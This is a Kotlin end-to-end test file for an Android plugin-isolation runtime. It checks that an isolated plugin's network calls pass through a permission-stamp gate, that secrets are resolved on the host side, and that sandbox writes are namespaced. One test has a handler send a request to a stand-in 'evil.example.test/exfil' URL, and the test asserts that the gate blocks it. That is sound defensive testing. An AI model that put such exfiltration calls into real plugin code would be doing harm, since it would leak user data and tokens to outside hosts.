package com.morainet.mcos.android.host.isolation

import com.morainet.mcos.runtime.core.error.McosErrorCode
import com.morainet.mcos.runtime.core.executor.Executor
import com.morainet.mcos.runtime.core.registry.CommandRegistry
import com.morainet.mcos.security.HmacAuthStampSigner
import com.morainet.mcos.security.SecurityConfig
import com.morainet.mcos.security.TrustLevel
import com.morainet.mcos.sdk.Artifact
import com.morainet.mcos.sdk.AuthStamp
import com.morainet.mcos.sdk.CommandHandler
import com.morainet.mcos.sdk.CommandManifestEntry
import com.morainet.mcos.sdk.CommandResult
import com.morainet.mcos.sdk.ExecutionContext
import com.morainet.mcos.sdk.HostServices
import com.morainet.mcos.sdk.HttpRequest
import com.morainet.mcos.sdk.McosPlugin
import com.morainet.mcos.sdk.PluginManifest
import com.morainet.mcos.sdk.ProviderInfo
import com.morainet.mcos.sdk.SideEffectClass
import kotlinx.coroutines.test.runTest
import kotlinx.serialization.json.JsonPrimitive
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.jsonPrimitive
import kotlinx.serialization.json.put
import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Test
import java.io.IOException

/**
 * Full-chain isolation E2E (item 42, slice 3b part 1): the REAL main-process
 * [Executor] dispatching a `MARKETPLACE_VERIFIED` plugin through
 * [TransportIsolationHost] → in-memory channel → [IsolatedPluginRunner] →
 * the plugin's handler → [IsolatedHostServicesProxy] → back over the
 * channel → [IsolatedFacadeServer] (identity + §8.2 stamp gate + §9.2
 * secret resolution + §8.3 namespacing) → the real host facade. Every
 * JVM-provable link of 08 §8.1-§8.3 in one test process; the Binder byte
 * pipe is the only thing left to swap in.
 *
 * The main-process registry holds the plugin MANIFEST ONLY (empty
 * `handlers()`), proving the main process carries none of the plugin's
 * code — the handler exists solely on the runner side.
 */
class IsolationEndToEndTest {

    private val pluginId = "e2e.isolated"
    private val commandId = "e2e.fetch"
    private val admittedUid = 10_101
    private val signer = HmacAuthStampSigner("e2e-key".toByteArray())

    /** Wiring for one scenario: fakes + channels + runner + real Executor. */
    private class Harness(
        val net: CapturingNetService,
        val secureStore: MapSecureStore,
        val sandbox: FakeFlatSandbox,
        val registry: CommandRegistry,
        val executor: Executor,
        val invokes: MutableList<String>,
    )

    /**
     * @param manifestOnly the main-process registration carries the manifest
     *        but no handlers (the isolation posture); pass false only for the
     *        in-process BUILTIN control test.
     */
    private fun harness(
        handler: CommandHandler,
        trustLevel: TrustLevel = TrustLevel.MARKETPLACE_VERIFIED,
        manifestOnly: Boolean = true,
        invokeChannelThrows: Boolean = false,
    ): Harness {
        val net = CapturingNetService()
        val secureStore = MapSecureStore()
        val sandbox = FakeFlatSandbox()
        val host: HostServices = FakeHostServices(net, secureStore, sandbox)
        val invokes = mutableListOf<String>()

        // main-process side: facade server over the real host facade
        val facadeServer = IsolatedFacadeServer(host, signer, pluginId, admittedUid)
        val facadeChannel = IsolationChannel { op, envelope -> facadeServer.handle(op, envelope, admittedUid) }

        // plugin-process side: the ONLY place the handler exists
        val runner = IsolatedPluginRunner(pluginWith(handler), facadeChannel)

        // main → plugin transport (throws to simulate plugin-process death)
        val invokeChannel = IsolationChannel { op, envelope ->
            invokes.add(op)
            if (invokeChannelThrows) throw IOException("plugin process died")
            runner.serveInvoke(envelope)
        }

        val registry = CommandRegistry()
        // main-process registration: manifest only — no plugin code carried.
        // Item 45: this is the REAL production path now (registerManifest),
        // not a handlers()-empty stand-in.
        if (manifestOnly) {
            registry.registerManifest(pluginWith(handler = null).manifest, trustLevel)
        } else {
            registry.register(pluginWith(handler), trustLevel)
        }

        val executor = Executor(
            registry,
            host,
            SecurityConfig.permissive().copy(signer = signer),
            isolationHost = TransportIsolationHost(invokeChannel),
        )
        return Harness(net, secureStore, sandbox, registry, executor, invokes)
    }

    private fun pluginWith(handler: CommandHandler?): McosPlugin = object : McosPlugin {
        override val manifest = PluginManifest(
            id = pluginId, name = "E2E", version = "1.0.0",
            minRuntimeVersion = "0.1.0",
            description = "isolation e2e plugin",
            provider = ProviderInfo("Test", "https://test.local"),
            entry = "com.test.E2E",
            commands = listOf(
                CommandManifestEntry(
                    id = commandId,
                    version = "1.0.0",
                    title = "Fetch",
                    description = "network fetch through the isolated facade",
                    sideEffectClass = SideEffectClass.network,
                ),
            ),
        )
        override suspend fun onLoad(services: HostServices) {}
        override suspend fun onUnload() {}
        override fun handlers(): Map<String, CommandHandler> =
            if (handler == null) emptyMap() else mapOf(commandId to handler)
    }

    /** A runtime-signed stamp granting egress to one domain, like Stage 6's output. */
    private fun networkStamp(domain: String = "api.example.test"): AuthStamp {
        val now = System.currentTimeMillis()
        return signer.sign(
            AuthStamp(
                runId = "", // the Executor binds the real runId and re-signs
                commandId = commandId,
                pluginId = pluginId,
                grantsUsed = setOf("network.$domain"),
                issuedAt = now,
                expiresAt = now + 300_000,
                signature = "",
            ),
        )
    }

    @Test
    fun fullChainHappyPathRunsTheHandlerInThePluginProcessWithScopedFacade() = runTest {
        val h = harness(handler = object : CommandHandler {
            override suspend fun invoke(ctx: ExecutionContext): CommandResult {
                val resp = ctx.services.net.request(
                    HttpRequest(
                        method = "POST",
                        url = "https://api.example.test/v1/thing",
                        body = "{{secret.apiToken}}".toByteArray(),
                        headers = mapOf("Authorization" to "Bearer {{secret.apiToken}}"),
                    ),
                )
                ctx.services.sandbox!!.write("out/result.txt", "ok".toByteArray())
                return CommandResult.Ok(JsonPrimitive(resp.bodyText))
            }
        })
        h.secureStore.put("apiToken", "tok-e2e".toByteArray())

        val result = h.executor.execute(
            commandId,
            args = buildJsonObject { put("kind", "full") },
            auth = networkStamp(),
            source = "CHAT",
        )

        val ok = result as CommandResult.Ok
        assertEquals("net-ok", (ok.value as JsonPrimitive).content)
        // The §8.2 gate admitted the call and §9.2 resolved the secret on the MAIN side.
        assertEquals("Bearer tok-e2e", h.net.lastHeaders["Authorization"])
        assertEquals("tok-e2e", h.net.lastBody)
        assertEquals(1, h.net.calls)
        // §8.3 namespacing: the plugin's write landed under <pluginId>/.
        assertEquals("ok", String(h.sandbox.files["$pluginId/out/result.txt"]!!))
        assertEquals(listOf(IsolationOps.OP_INVOKE), h.invokes)
    }

    @Test
    fun outOfScopeUrlInTheHandlerIsDeniedByTheFacadeGateEndToEnd() = runTest {
        val h = harness(handler = object : CommandHandler {
            override suspend fun invoke(ctx: ExecutionContext): CommandResult {
                // The URL lives in handler code, not in the audited args —
                // exactly the confused-deputy case §8.2 exists for.
                ctx.services.net.request(HttpRequest(url = "https://evil.example.test/exfil"))
                error("unreachable")
            }
        })

        val result = h.executor.execute(commandId, auth = networkStamp(domain = "api.example.test"))

        val err = result as CommandResult.Err
        assertEquals("PERMISSION_DENIED", err.code)
        assertEquals("stamp_scope_mismatch", err.details["reason"]!!.jsonPrimitive.content)
        assertEquals("no byte may leave the host after the gate denies", 0, h.net.calls)
    }

    @Test
    fun autoApprovedStampWithoutNetworkScopeStillCannotEgress() = runTest {
        // No auth supplied: the permissive kernel auto-approves and mints a
        // stamp with only the descriptor's (empty) permissions — §8.2 must
        // still refuse egress regardless of the approval.
        val h = harness(handler = object : CommandHandler {
            override suspend fun invoke(ctx: ExecutionContext): CommandResult {
                ctx.services.net.request(HttpRequest(url = "https://api.example.test/v1"))
                error("unreachable")
            }
        })

        val result = h.executor.execute(commandId)

        val err = result as CommandResult.Err
        assertEquals("PERMISSION_DENIED", err.code)
        assertEquals("stamp_scope_mismatch", err.details["reason"]!!.jsonPrimitive.content)
        assertEquals(0, h.net.calls)
    }

    @Test
    fun pluginProcessDeathMapsToPluginErrorThroughTheExecutor() = runTest {
        val h = harness(handler = object : CommandHandler {
            override suspend fun invoke(ctx: ExecutionContext): CommandResult = error("unreachable")
        }, invokeChannelThrows = true)

        val result = h.executor.execute(commandId, auth = networkStamp())

        val err = result as CommandResult.Err
        assertEquals(McosErrorCode.PLUGIN_ERROR.name, err.code)
        assertEquals(
            TransportIsolationHost.TRANSPORT_FAILURE,
            err.details["reason"]!!.jsonPrimitive.content,
        )
    }

    @Test
    fun builtinPluginStaysInProcessWithTheWholeStackWired() = runTest {
        var ran = false
        val h = harness(
            handler = object : CommandHandler {
                override suspend fun invoke(ctx: ExecutionContext): CommandResult {
                    ran = true
                    return CommandResult.Ok(JsonPrimitive("local"))
                }
            },
            trustLevel = TrustLevel.BUILTIN,
            manifestOnly = false,
        )

        val result = h.executor.execute(commandId)

        val ok = result as CommandResult.Ok
        assertEquals("local", (ok.value as JsonPrimitive).content)
        assertTrue(ran)
        assertTrue("BUILTIN must never cross the isolation channel", h.invokes.isEmpty())
    }

    @Test
    fun artifactsSurviveTheWholeChain() = runTest {
        val h = harness(handler = object : CommandHandler {
            override suspend fun invoke(ctx: ExecutionContext): CommandResult = CommandResult.Ok(
                value = JsonPrimitive("rendered"),
                artifacts = listOf(
                    Artifact(type = "image", uri = "file:///sandbox/shot.jpg", mimeType = "image/jpeg"),
                ),
            )
        })

        val result = h.executor.execute(commandId, auth = networkStamp())

        val ok = result as CommandResult.Ok
        assertEquals(1, ok.artifacts.size)
        assertEquals("image/jpeg", ok.artifacts.single().mimeType)
    }
}
